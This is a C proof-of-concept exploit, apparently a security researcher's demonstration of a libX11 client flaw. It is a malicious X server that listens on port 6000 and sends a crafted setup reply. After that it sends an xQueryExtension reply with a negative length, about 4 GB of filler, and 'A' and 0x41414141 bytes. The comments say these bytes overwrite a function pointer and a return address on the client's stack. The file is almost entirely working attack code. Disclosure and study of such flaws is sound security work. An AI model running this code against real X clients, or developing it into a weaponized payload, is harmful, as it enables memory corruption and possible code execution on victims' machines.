/* Chris Evans - demo of libX11 flaw. Tricky one this. */
  
/* Disclaimer - I haven't bothered to beutify this. It probably is tied
 * to little endian machines. Return values go unchecked, etc. ;-)
 */ 
  
#include <unistd.h>             
#include <string.h>
  
#include <sys/types.h>    
#include <sys/socket.h>         
  
#include <netinet/in.h>                
  
int
main(int argc, const char* argv[])
{ 
  static int port = 6000;       
  
  char sendbuf[32768];          
  char recvbuf[1024];      
  struct sockaddr_in local_addr;
  struct sockaddr_in remote_addr;
  int remote_addrlen;     
  int listen_fd;
  int accept_fd;
  char c;                 
  short s;
  int i;                  
  unsigned int bigsend;   
  
  listen_fd = socket(PF_INET, SOCK_STREAM, 6);
  
  local_addr.sin_family = AF_INET;
  local_addr.sin_addr.s_addr = INADDR_ANY;
  local_addr.sin_port = htons(port);
  bind(listen_fd, (struct sockaddr*)&local_addr, sizeof(local_addr));
  
  listen(listen_fd, 1);
  
  accept_fd = accept(listen_fd, (struct sockaddr*)&remote_addr,  
                     &remote_addrlen);
  
  /* Read initial client connection packet */
  read(accept_fd, recvbuf, 12); 
  /* Absorb auth details */
  s = * ((short*)&recvbuf[6]);
  s += * ((short*)&recvbuf[8]);
  read(accept_fd, recvbuf, s);
  
  /* Send back the nasty reply */
  /* xConnSetupPrefix */
  c = 1;                        /* CARD8 success: xTrue */
  write(accept_fd, &c, 1);
  c = 0;                        /* BYTE lengthReason: 0 */
  write(accept_fd, &c, 1);
  s = 11;                       /* CARD16: majorVersion: 11 */
  write(accept_fd, &s, 2);
  s = 0;                        /* CARD16: minorVersion: 0 (irrelevant) */
  write(accept_fd, &s, 2);
  s = (32 + 40) >> 2;                  /* CARD16: length (of setup packet) */
  write(accept_fd, &s, 2);
   
  /* xConnSetup, 32 bytes */
  i = 0;                        /* CARD32: release */
  write(accept_fd, &i, 4);      
  i = 0;                        /* CARD32: ridBase */
  write(accept_fd, &i, 4);      
  i = 1;                        /* CARD32: ridMask: 1. 0 causes 100% CPU */
  write(accept_fd, &i, 4);
  i = 0;                        /* CARD32: motionBufferSize */
  write(accept_fd, &i, 4);
  s = 0;                        /* CARD16: nbytesVendor */
  write(accept_fd, &s, 2);
  s = 0;                        /* CARD16: maxRequestSize */
  write(accept_fd, &s, 2);
  c = 1;                        /* CARD8: numRoots: need 1+ to work */
  write(accept_fd, &c, 1);
  c = 0;                        /* CARD8: numFormats */
  write(accept_fd, &c, 1);
  c = 0;                        /* CARD8: imageByteOrder */
  write(accept_fd, &c, 1);
  c = 0;                        /* CARD8: bitmapBitOrder */
  write(accept_fd, &c, 1);
  c = 0;                        /* CARD8: bitmapScanlineUnit */
  write(accept_fd, &c, 1);
  c = 0;                        /* CARD8: bit:mapScanlinePad */
  write(accept_fd, &c, 1);
  c = 0;                        /* KeyCode (CARD8): minKeyCode */
  write(accept_fd, &c, 1);
  c = 0;                        /* KeyCode (CARD8): maxKeyCode */
  write(accept_fd, &c, 1);
  i = 0;                        /* CARD32: pad */
  write(accept_fd, &i, 4); 
  
  /* xWindowRoot x 1 - 40 bytes */
  /* Contains a "nDepths" - no further data needed if it's set to 0 */
  memset(sendbuf, '\0', 40);
  write(accept_fd, sendbuf, 40); 
  
  /* read 64 bytes of X requests */
  /* From:
   * xCreateGC, 20 bytes + 4 bytes of values (i.e. 1)     
   * xQueryExtention, 20 bytes - querying for big requests
   * xGetProperty, 24 bytes - querying for XA_RESOURCE_MANAGER
   */
  read(accept_fd, recvbuf, 64); 
  
  /* Reply to xQueryExtension - an async reply */ 
  c = 1;                        /* type (BYTE): X_Reply (1) */
  write(accept_fd, &c, 1);
  c = 0;                        /* varies */
  write(accept_fd, &c, 1);
  s = 2;                        /* sequenceNumber (CARD16): 2nd */
  write(accept_fd, &s, 2);
  i = -17;                      /* length (CARD32): signed games here */
  write(accept_fd, &i, 4); 
  i = 0x41414141;               /* pad (CARD32); 6 of them */
  /* NOTE - in this program's current form, it seems to be these values
   * which make their way onto the stack, overwriting a function pointer
   */ 
  write(accept_fd, &i, 4);
  write(accept_fd, &i, 4);
  write(accept_fd, &i, 4);
  write(accept_fd, &i, 4);
  write(accept_fd, &i, 4);
  write(accept_fd, &i, 4);
  
  /* Now we've got to send a _lot_ of data back to the client - it's trying
   * to read ~4Gb, grrr.  
   */ 
  
  c = 0;                        
  bigsend = (unsigned int)-17;
  bigsend <<= 2;       
  while (bigsend > 0)     
  { 
    unsigned int to_send = bigsend;
    if (to_send > 32768)
    {
      to_send = 32768;          
    }
  
    write(accept_fd, sendbuf, to_send);
    bigsend -= to_send;
  
    if (!c)
    {
      printf("to_go: %u\n", bigsend);
    }     
    c++;
  }
   
  /* Send another xreply - the first 28 bytes are read onto
   * the stack.
   */
  /* NOTE - in its current form, these A's make their way to some unspecified
   * area of stack. In testing I've easily clobbered a return address with
   * these
   */ 
  memset(sendbuf, 'A', 28);
  write(accept_fd, sendbuf, 28);
  
  memset(sendbuf, '\0', 32);    
  /* First char of buffer, 0, represents X_Error */
  write(accept_fd, sendbuf, 32);
  
  while(1);
}     